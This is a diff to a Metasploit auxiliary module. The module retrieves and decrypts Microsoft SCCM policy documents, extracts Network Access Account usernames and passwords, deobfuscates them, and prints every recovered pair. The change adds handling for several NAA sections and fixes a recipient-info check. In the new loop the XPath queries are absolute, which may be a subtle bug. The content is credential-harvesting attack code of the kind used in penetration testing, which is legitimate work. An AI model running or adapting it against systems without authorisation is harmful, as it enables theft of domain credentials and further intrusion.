@@ -127,9 +127,11 @@ class MetasploitModule < Msf::Auxiliary
       sleep(duration)
       naa_policy_url = get_policies(http_opts, mp, key, cert, sms_id)
       decrypted_policy = request_policy(http_opts, naa_policy_url, sms_id, key)
-      username, password = get_creds_from_policy_doc(decrypted_policy)
+      results = get_creds_from_policy_doc(decrypted_policy)
 
-      print_good("Found valid NAA creds: #{username}:#{password}")
+      results.each do |username, password|
+        print_good("Found valid NAA creds: #{username}:#{password}")
+      end
     end
   rescue Errno::ECONNRESET
     fail_with(Failure::Disconnected, 'The connection was reset.')
@@ -165,7 +167,7 @@ class MetasploitModule < Msf::Auxiliary
     cms_envelope = ci.enveloped_data
 
     ri = cms_envelope[:recipient_infos]
-    if ri.empty?
+    if ri.value.empty?
       fail_with(Failure::UnexpectedReply, 'No recipient infos provided')
     end
 
@@ -320,14 +322,18 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_creds_from_policy_doc(policy)
     xml_doc = Nokogiri::XML(policy)
-    naa_section = xml_doc.xpath(".//instance[@class='CCM_NetworkAccessAccount']")
-    username = naa_section.xpath("//property[@name='NetworkAccessUsername']/value").text
-    password = naa_section.xpath("//property[@name='NetworkAccessPassword']/value").text
+    naa_sections = xml_doc.xpath(".//instance[@class='CCM_NetworkAccessAccount']")
+    results = Set.new
+    naa_sections.each do |section|
+      username = section.xpath("//property[@name='NetworkAccessUsername']/value").text
+      username = deobfuscate_policy_value(username)
 
-    username = deobfuscate_policy_value(username)
-    password = deobfuscate_policy_value(password)
+      password = section.xpath("//property[@name='NetworkAccessPassword']/value").text
+      password = deobfuscate_policy_value(password)
 
-    [username, password]
+      results.add([username, password])
+    end
+    results
   end
 
   def deobfuscate_policy_value(value)
